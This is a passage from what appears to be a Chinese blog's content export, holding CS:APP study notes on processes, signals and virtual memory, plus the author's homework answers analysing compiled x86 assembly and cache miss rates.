class="keyword">int</span> options)</span>    <span class="comment">//调用waitpid函数来等待它的子进程终止或停止</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(深入理解计算机系统——基础知识/<span class="keyword">int</span> *status)</span>      <span class="comment">//waitpid函数的简化版本，等价于调用waitpid(-1, status, 0)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span>   <span class="comment">//让进程休眠secs秒，返回值为剩余秒数，如果收到中断信号，则可能不为0</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">void</span>)</span>              <span class="comment">//让进城休眠直到等到一个信号，总是返回-1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *argv[], <span class="keyword">const</span> <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"><span class="comment">//execve函数加载并运行可执行文件filename，参数列表argv和环境列表envp。</span></span></span><br><span class="line"><span class="function"><span class="comment">//如果成功，则不返回；如果错误，返回-1</span></span></span><br></pre></td></tr></table></figure>

<p><strong>子进程和父进程执行的特点：</strong></p>
<ol>
<li><strong>fork调用一次返回两次</strong>，一次子进程返回0，一次父进程返回PID，可以用来分辨处于子进程还是父进程。。</li>
<li><strong>并发执行。</strong>父进程子进程相互独立，并发执行。先后顺序不一定。</li>
<li><strong>相同但是独立的地址空间。</strong>除了私有地址空间之外，代码、变量值完全相同，因此<strong>对数据做出的改变都是独立的</strong>。</li>
<li><strong>共享文件。</strong>子进程会继承父进程打开的文件，当父进程调用fork时，std文件打开所以子进程不用再打开一次std文件，而是直接输出</li>
</ol>
<p><strong>fork的执行过程理解</strong>：当执行fork函数时，可以理解为分支，也就是从fork位置开始分成两支，并发执行接下来的代码。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610204730139.png" alt="image-20210610204730139"></p>
<p><strong>加载一个可执行文件</strong>需要的<strong>命令行参数列表</strong>和<strong>环境列表</strong>：</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610210812718.png" alt="image-20210610210812718"></p>
<p>新的程序开始时，一个<strong>典型的用户栈结构</strong>：</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610211302212.png" alt="image-20210610211302212"></p>
<h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p><strong>Unix信号</strong>是一种更高层的软件形式的<strong>异常</strong>，<strong>允许进程中断其他进程</strong>。</p>
<p>一个<strong>信号</strong>就是一条小消息，它通知进程系统中发生了一个某种类型的<strong>事件</strong>。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610212141906.png" alt="image-20210610212141906"></p>
<h2 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h2><p><strong>虚拟存储器</strong>：一个由存放在<strong>磁盘</strong>上的<strong>N个连续</strong>的<strong>字节大小的单元</strong>组成的数组。每个字节和虚拟地址是<strong>一一对应</strong>的。</p>
<p><strong>虚拟地址：</strong>就是<strong>磁盘</strong>上<strong>数组的索引</strong>。要比物理地址大很多。VPN作为页表的索引。VPO有p位定位业内的字节位置。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210617153531081.png" alt="image-20210617153531081"></p>
<p><strong>解决4 GB内存空间的不足问题：</strong>只将磁盘中的一部分放入内存中，以后根据实际的需要随时从硬盘中调入内容。</p>
<p><strong>物理寻址和虚拟寻址</strong></p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610220900167.png" alt="image-20210610220900167"></p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210610220914701.png" alt="image-20210610220914701"></p>
<p><strong>磁盘</strong>：在<strong>存储器层次</strong>是处于<strong>主存</strong>之下的一层。</p>
<p><strong>虚拟页和物理页：</strong>VM系统将<strong>虚拟存储器</strong>分割为<strong>虚拟页（VP）</strong>的固定大小的<strong>块</strong>来进行与主存间的传输，<strong>大小为P字节</strong>，<strong>物理页（PP）</strong>同样也是<strong>P字节</strong>大小</p>
<p><strong>页表：</strong>就是一个<strong>页表条目（PTE）</strong>的数组。 为了判定一个虚拟页在哪个物理页，未命中判断虚拟页存放在磁盘的哪个位置，然后选择一个物理页作为牺牲页进行替换。</p>
<p><strong>页表条目：</strong>一个<strong>有效位</strong>和<strong>n位地址</strong>组成。如果<strong>设置有效位</strong>，那么<strong>地址</strong>表示DRAM中<strong>物理页的起始位置</strong>，这个物理页<strong>缓存了该虚拟页</strong>。如果<strong>没有设置有效位</strong>，那么空地址表示该<strong>虚拟页未被分配</strong>。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210616224133179.png" alt="image-20210616224133179"></p>
<p><strong>VM页命中：</strong>对VP2的一个字的引用就会命中。也就是已经缓存在DRAM的</p>
<p><strong>VM缺页：</strong>对<strong>VP3的引用不命中</strong>，从而触发缺页。然后选择<strong>VP4作为牺牲页</strong>，并从磁盘<strong>用VP3的拷贝来取代它</strong>。在缺页处理程序重新启动后，该指令将从存储器中正常读取字，而不会产生异常。</p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——课程作业2</title>
    <url>/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业2"><a href="#深入理解计算机系统——课程作业2" class="headerlink" title="深入理解计算机系统——课程作业2"></a>深入理解计算机系统——课程作业2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>五一放假还有作业。。。</p>
<p>课程作业2共有三个题，都是分析汇编代码</p>
<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include &quot;stdio.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//define H ?  //定义常数H          //H=37</span></span><br><span class="line"><span class="comment">//define J ?  //定义常数J          //J=16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> array1[H][J]; </span><br><span class="line"><span class="keyword">int</span> array2[J][H]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    array1[x][y] = x+<span class="number">2</span>*y;</span><br><span class="line">    array2[y][x] = y-x*x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>Ubuntu 32位</code>系统下经过<code>gcc</code>汇编后，得到的函数f汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f:</span><br><span class="line">pushl     %ebp            //ebp入栈</span><br><span class="line">movl     %esp, %ebp       //ebp设为现在的帧指针</span><br><span class="line">pushl     %ebx            //ebx入栈</span><br><span class="line">movl     8(%ebp), %ecx    //ecx= M(8+ebp)=x</span><br><span class="line">movl     12(%ebp), %edx   //edx= M(12+ebp)=y</span><br><span class="line">movl     12(%ebp), %eax   //eax= M(12+ebp)=y</span><br><span class="line">addl     %eax, %eax       //eax=2*eax=2*y</span><br><span class="line">addl     8(%ebp), %eax    //eax= M(8+ebp)+eax=x+2*y</span><br><span class="line">sall     $4, %ecx         //ecx=ecx*16=16*x</span><br><span class="line">leal     (%ecx,%edx), %edx  //edx= ecx+edx =16*x+y,so J=16</span><br><span class="line">movl     %eax, array1(,%edx,4)   //array1[edx]=eax</span><br><span class="line">movl     12(%ebp), %edx   //edx=M(12+ebp)=y</span><br><span class="line">movl     8(%ebp), %ebx    //ebx=M(8+ebp)=x</span><br><span class="line">movl     8(%ebp), %eax    //eax=M(8+ebp)=x</span><br><span class="line">imull     8(%ebp), %eax    //eax=eax*M(8+ebp)=x*x</span><br><span class="line">movl     12(%ebp), %ecx    //ecx=M(12+ebp)=y</span><br><span class="line">subl     %eax, %ecx       //ecx=ecx-eax=y-x*x</span><br><span class="line">movl     %edx, %eax       //eax=edx=y</span><br><span class="line">sall     $3, %eax          //eax=eax*8=8*y</span><br><span class="line">addl     %edx, %eax       //eax=eax+edx=8*y+y</span><br><span class="line">sall     $2, %eax         //eax=eax*4=9*y*4</span><br><span class="line">addl     %edx, %eax       //eax=edx+eax=36*y+y</span><br><span class="line">addl     %ebx, %eax        //eax=ebx+eax=37*y+x,so H=37</span><br><span class="line">movl     %ecx, array2(,%eax,4)   //array2[eax]=ecx=y-x*x</span><br><span class="line">popl     %ebx              //ebx出栈</span><br><span class="line">popl     %ebp              //ebp出栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>请分析每一行汇编代码的意义，并给出常数<code>H</code>和<code>J</code>的值。（20.0分）</p>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>如下为一个c语言程序中的函数及其在32位系统下编译得到的汇编语言程序代码，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">aprod</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, x, y, z;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; （  <span class="number">1</span>  ）; （  <span class="number">2</span>  ）) &#123;       <span class="comment">//i&lt;(n-2)    i+=3</span></span><br><span class="line">        （  <span class="number">3</span>  ）;                           <span class="comment">//x=a[i]</span></span><br><span class="line">        （  <span class="number">4</span>  ）;                           <span class="comment">//y=a[i+1]</span></span><br><span class="line">        （  <span class="number">5</span>  ）;                           <span class="comment">//z=a[i+2]</span></span><br><span class="line">        （  <span class="number">6</span>  ）;                           <span class="comment">//r=r*x*y*z</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; n; i++)</span><br><span class="line">        （  <span class="number">7</span>  ）;                           <span class="comment">//r=a[i]*r  </span></span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在32位系统中用<code>gcc</code>编译后，函数<code>aprod</code>对应的汇编语言程序代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aprod:</span><br><span class="line">pushl     %ebp           //ebp入栈</span><br><span class="line">movl     %esp, %ebp      //ebp设为现在的帧指针</span><br><span class="line">subl     $32, %esp       //esp=esp-32，预留32字节给函数临时变量</span><br><span class="line">movl     $1, -20(%ebp)   //r=M(ebp-20)=1</span><br><span class="line">movl     $0, -4(%ebp)    //i=M(ebp-4)=0</span><br><span class="line">jmp      .l2             //无条件跳转到.l2</span><br><span class="line"></span><br><span class="line">.l3:</span><br><span class="line">movl     -4(%ebp), %eax  //eax=M(ebp-4)=i</span><br><span class="line">sall     $2, %eax        //eax=eax*4=i*4</span><br><span class="line">addl     8(%ebp), %eax   //eax=eax+M(8+ebp)=4i+a[]</span><br><span class="line">movl     (%eax), %eax    //eax=M(eax)=a[i]</span><br><span class="line">movl     %eax, -8(%ebp)  //x=M(ebp-8)=eax=a[i]</span><br><span class="line">movl     -4(%ebp), %eax  //eax=M(ebp-4)=i</span><br><span class="line">addl     $1, %eax        //eax=eax+1=i+1</span><br><span class="line">sall     $2, %eax        //eax=eax*4=4*(i+1)</span><br><span class="line">addl     8(%ebp), %eax   //eax=M(8+ebp)=4*[i+1]+a[]</span><br><span class="line">movl     (%eax), %eax    //eax=M(eax)=a[i+1]</span><br><span class="line">movl     %eax, -12(%ebp) //y=M(ebp-12)=eax=a[i+1]</span><br><span class="line">movl     -4(%ebp), %eax  //eax=(ebp-4)=i</span><br><span class="line">addl     $2, %eax        //eax=eax+2=i+2</span><br><span class="line">sall     $2, %eax         //eax=eax*4=4*(i+2)</span><br><span class="line">addl     8(%ebp), %eax    //eax=eax+M(8+ebp)=a[]+4*(i+2)</span><br><span class="line">movl     (%eax), %eax     //eax=M(eax)=a[i+2]</span><br><span class="line">movl     %eax, -16(%ebp)  //z=M(-16+ebp)=eax=a[i+2]</span><br><span class="line">movl     -20(%ebp), %eax  //eax=M(-20+ebp)=r</span><br><span class="line">imull     -8(%ebp), %eax  //eax*=M(-8+ebp)=r*x</span><br><span class="line">imull     -12(%ebp), %eax //eax*=M(-12+ebp)=r*x*y</span><br><span class="line">imull     -16(%ebp), %eax  //eax*=M(-16+ebp)=r*x*y*z</span><br><span class="line">movl     %eax, -20(%ebp)  //r=M(-20+ebp)=eax=r*x*y*z</span><br><span class="line">addl     $3, -4(%ebp)     //i=M(-4+ebp)+=3=i+3</span><br><span class="line"></span><br><span class="line">.l2:</span><br><span class="line">movl     12(%ebp), %eax    //eax=M(12+ebp)=n</span><br><span class="line">subl     $2, %eax          //eax=eax-2=n-2</span><br><span class="line">cmpl     -4(%ebp), %eax    //compare eax=n-2 with M(ebp-4)=i</span><br><span class="line">jg       .l3               //eax=n-2 &gt; M(ebp-4)=i则跳转.l3</span><br><span class="line">jmp      .l4               //无条件跳转.l4</span><br><span class="line"></span><br><span class="line">.l5:</span><br><span class="line">movl     -4(%ebp), %eax   //eax=M(-4+ebp)=i</span><br><span class="line">sall     $2, %eax         //eax=eax*4=4*i</span><br><span class="line">addl     8(%ebp), %eax    //eax=eax+M(8+ebp)=a[]+4*i</span><br><span class="line">movl     (%eax), %eax     //eax=M(eax)=a[i]</span><br><span class="line">movl     -20(%ebp), %edx   //edx=M(-20+ebp)=r</span><br><span class="line">imull     %edx, %eax      //eax=eax*edx=a[i]*r</span><br><span class="line">movl     %eax, -20(%ebp)   //r=M(-20+ebp)=eax=a[i]*r</span><br><span class="line">addl     $1, -4(%ebp)      //i=M(-4+ebp)+1</span><br><span class="line"></span><br><span class="line">.l4:</span><br><span class="line">movl     -4(%ebp), %eax    //eax=M(-4+ebp)=i</span><br><span class="line">cmpl     12(%ebp), %eax    //compare eax=i with M(12+ebp)=n</span><br><span class="line">jl       .l5               //eax=i &lt; M(12+ebp)=n则跳转</span><br><span class="line">movl     -20(%ebp), %eax   //eax=M(-20+ebp)=r，返回值为r</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>请详细说明每条汇编语句的意义，并将这个函数补充完整。（40.0分）</p>
<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>如下为一个c语言程序中的函数及其在32位系统下编译得到的汇编语言程序代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//incl  ude &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">frac</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;           </span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">2</span>) <span class="keyword">return</span> ______;           <span class="comment">//a*a</span></span><br><span class="line">    <span class="keyword">return</span> _______;                  <span class="comment">//frac(a-2)+a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c= ______;                  <span class="comment">// frac(a+b)</span></span><br><span class="line">    <span class="keyword">return</span> ______;                  <span class="comment">// 2*c+b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">10</span>,j=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> k=sum(_______,______);       <span class="comment">//int k=sum(j-i,i++);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frac:</span><br><span class="line">pushl  %ebp             //ebp入栈</span><br><span class="line">movl  %esp, %ebp        //ebp=esp，设为当前的帧指针</span><br><span class="line">subl  $24, %esp         //esp=esp-24，预留24字节给临时变量</span><br><span class="line">cmpl  $1, 8(%ebp)       //compare a=M(8+ebp) with 1</span><br><span class="line">jg    .l2                //a=M(8+ebp) &gt; 1则跳转到.l2</span><br><span class="line">movl  8(%ebp), %eax      //eax=M(8+ebp)=a</span><br><span class="line">imull  8(%ebp), %eax     //eax*=M(8+ebp)=a*a</span><br><span class="line">jmp   .l3                 //无条件跳转.l3</span><br><span class="line"></span><br><span class="line">.l2:</span><br><span class="line">movl  8(%ebp), %eax      //eax=M(8+ebp)=a</span><br><span class="line">subl  $2, %eax           //eax=eax-2=a-2</span><br><span class="line">movl  %eax, (%esp)        //M(esp)=eax=a-2</span><br><span class="line">call  frac               //递归fun(a-2)</span><br><span class="line">addl  8(%ebp), %eax       //eax=eax+M(8+ebp)=fun(a-2)+a</span><br><span class="line"></span><br><span class="line">.l3:</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum:</span><br><span class="line">pushl  %ebp              //ebp入栈</span><br><span class="line">movl  %esp, %ebp         //ebp=esp,设为现在的栈指针</span><br><span class="line">subl  $40, %esp          //esp=esp-40,预留40字节给临时变量</span><br><span class="line">movl  12(%ebp), %eax     //eax=M(ebp+12)=b</span><br><span class="line">movl  8(%ebp), %edx      //edx=M(ebp+8)=a</span><br><span class="line">addl  %edx, %eax         //eax=eax+edx=a+b</span><br><span class="line">movl  %eax, (%esp)       //M(esp)=eax=a+b</span><br><span class="line">call  frac               //调用frac(a+b)</span><br><span class="line">movl  %eax, -12(%ebp)    //c=M(ebp-12)=eax=frac(a+b)</span><br><span class="line">movl  -12(%ebp), %eax    //eax=M(ebp-12)=c</span><br><span class="line">addl  %eax, %eax         //eax=2*eax=2*c</span><br><span class="line">addl  12(%ebp), %eax     //eax=eax+M(ebp+12)=2*c+b</span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">pushl  %ebp           //ebp入栈</span><br><span class="line">movl  %esp, %ebp      //ebp设为现在的栈指针</span><br><span class="line">andl  $-16, %esp      //esp=esp &amp; 0xfffffff0</span><br><span class="line">subl  $32, %esp       //esp=esp-32,预留32位字节给临时变量</span><br><span class="line">movl  $10, 20(%esp)   //i=M(20+esp)=10</span><br><span class="line">movl  $6, 24(%esp)    //j=M(24+esp)=6</span><br><span class="line">movl  20(%esp), %eax  //eax=M(20+esp)=i</span><br><span class="line">movl  24(%esp), %edx  //edx=M(24+esp)=j</span><br><span class="line">subl  %eax, %edx       //edx=edx-eax=j-i=-4</span><br><span class="line">movl  20(%esp), %eax   //eax=M(20+esp)=i=10</span><br><span class="line">addl  $1, 20(%esp)     //i=M(20+esp)+1=11</span><br><span class="line">movl  %edx, 4(%esp)    //M(4+esp)=edx=-4</span><br><span class="line">movl  %eax, (%esp)     //M(esp)=eax=10</span><br><span class="line">call  sum              //调用sum(j-i,i++)</span><br><span class="line">movl  %eax, 28(%esp)   //k=M(28+esp)=eax，将sum函数返回值赋给k</span><br><span class="line">movl  $0, %eax         //eax=0, return 0</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>请详细说明每条汇编语句的意义，并将这个函数补充完整。（40.0分）</p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——课程作业6</title>
    <url>/2021/05/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A6/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业6"><a href="#深入理解计算机系统——课程作业6" class="headerlink" title="深入理解计算机系统——课程作业6"></a>深入理解计算机系统——课程作业6</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>今天做作业6</p>
<h2 id="题一：家庭作业6-30"><a href="#题一：家庭作业6-30" class="headerlink" title="题一：家庭作业6.30"></a>题一：家庭作业6.30</h2><h3 id="A、地址格式"><a href="#A、地址格式" class="headerlink" title="A、地址格式"></a>A、地址格式</h3><p><img src="/2021/05/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A6/image-20210525211625958.png" alt="image-20210525211625958"></p>
<h3 id="B、读写操作顺序执行结果"><a href="#B、读写操作顺序执行结果" class="headerlink" title="B、读写操作顺序执行结果"></a>B、读写操作顺序执行结果</h3><p><img src="/2021/05/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A6/image-20210525212521139.png" alt="image-20210525212521139"></p>
<h2 id="题二：家庭作业6-31"><a href="#题二：家庭作业6-31" class="headerlink" title="题二：家庭作业6.31"></a>题二：家庭作业6.31</h2><h3 id="A、高速缓存C的大小"><a href="#A、高速缓存C的大小" class="headerlink" title="A、高速缓存C的大小"></a>A、高速缓存C的大小</h3><p><code>C = S * E * B = 128</code>，大小为128字节</p>
<h3 id="B、地址格式"><a href="#B、地址格式" class="headerlink" title="B、地址格式"></a>B、地址格式</h3><p><img src="/2021/05/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A6/image-20210525213035291.png" alt="image-20210525213035291"></p>
<h2 id="题三：家庭作业6-32"><a href="#题三：家庭作业6-32" class="headerlink" title="题三：家庭作业6.32"></a>题三：家庭作业6.32</h2><h3 id="A、0x0718地址格式"><a href="#A、0x0718地址格式" class="headerlink" title="A、0x0718地址格式"></a>A、0x0718地址格式</h3><p><img src="/2021/05/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A6/image-20210525213634359.png" alt="image-20210525213634359"></p>
<h3 id="B、存储器引用"><a href="#B、存储器引用" class="headerlink" title="B、存储器引用"></a>B、存储器引用</h3><p><img src="/2021/05/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A6/image-20210525213953712.png" alt="image-20210525213953712"></p>
<h2 id="题四：家庭作业6-37"><a href="#题四：家庭作业6-37" class="headerlink" title="题四：家庭作业6.37"></a>题四：家庭作业6.37</h2><h3 id="A、假设高速缓存的1024字节，直接映射，高速缓存块的大小是32字节，不命中率是多少"><a href="#A、假设高速缓存的1024字节，直接映射，高速缓存块的大小是32字节，不命中率是多少" class="headerlink" title="A、假设高速缓存的1024字节，直接映射，高速缓存块的大小是32字节，不命中率是多少"></a>A、假设高速缓存的1024字节，直接映射，高速缓存块的大小是32字节，不命中率是多少</h3><p>不命中率是100%，因为直接映射，<code>x</code>数组大小为<code>256 * 2 * 4 = 2048</code>字节，<code>x[0][i]</code>和<code>x[1][i]</code>对应同一个高速缓存数据块，所以每次都会容量不命中。</p>
<h3 id="B、假设高速缓存的2048字节，其他同上"><a href="#B、假设高速缓存的2048字节，其他同上" class="headerlink" title="B、假设高速缓存的2048字节，其他同上"></a>B、假设高速缓存的2048字节，其他同上</h3><p>不命中率是12.5%，因为缓存足够大，所以只有冷不命中，也就是4/32 = 1/8</p>
<h3 id="C、假设高速缓存的1024字节，两路组相连，高速缓存块的大小是32字节，不命中率是多少"><a href="#C、假设高速缓存的1024字节，两路组相连，高速缓存块的大小是32字节，不命中率是多少" class="headerlink" title="C、假设高速缓存的1024字节，两路组相连，高速缓存块的大小是32字节，不命中率是多少"></a>C、假设高速缓存的1024字节，两路组相连，高速缓存块的大小是32字节，不命中率是多少</h3><p>只有冷不命中，不命中率为12.5%。</p>
<h3 id="D、对于情况3，提高高速缓存大小帮助降低不命中率吗？原因？"><a href="#D、对于情况3，提高高速缓存大小帮助降低不命中率吗？原因？" class="headerlink" title="D、对于情况3，提高高速缓存大小帮助降低不命中率吗？原因？"></a>D、对于情况3，提高高速缓存大小帮助降低不命中率吗？原因？</h3><p>不会降低，因为块大小不变时，冷不命中的概率不可能被减小。</p>
<h3 id="E、对于情况3，更大的块大小帮助降低不命中率吗？原因？"><a href="#E、对于情况3，更大的块大小帮助降低不命中率吗？原因？" class="headerlink" title="E、对于情况3，更大的块大小帮助降低不命中率吗？原因？"></a>E、对于情况3，更大的块大小帮助降低不命中率吗？原因？</h3><p>会降低，因为一个块的大小增加，冷不命中的频率就降低。</p>
<h2 id="题五：家庭作业6-42"><a href="#题五：家庭作业6-42" class="headerlink" title="题五：家庭作业6.42"></a>题五：家庭作业6.42</h2><p>每行只有4个字节，那只可能是循环中后三个命中，第一个不命中，不命中率为0.25。</p>
<h2 id="题六：家庭作业6-43"><a href="#题六：家庭作业6-43" class="headerlink" title="题六：家庭作业6.43"></a>题六：家庭作业6.43</h2><p>每行只有4个字节，每次要写一个char，不命中率仍然为0.25</p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——课程作业5</title>
    <url>/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业5"><a href="#深入理解计算机系统——课程作业5" class="headerlink" title="深入理解计算机系统——课程作业5"></a>深入理解计算机系统——课程作业5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>突然要做作业不会做，昨天学了一手，今天开始写</p>
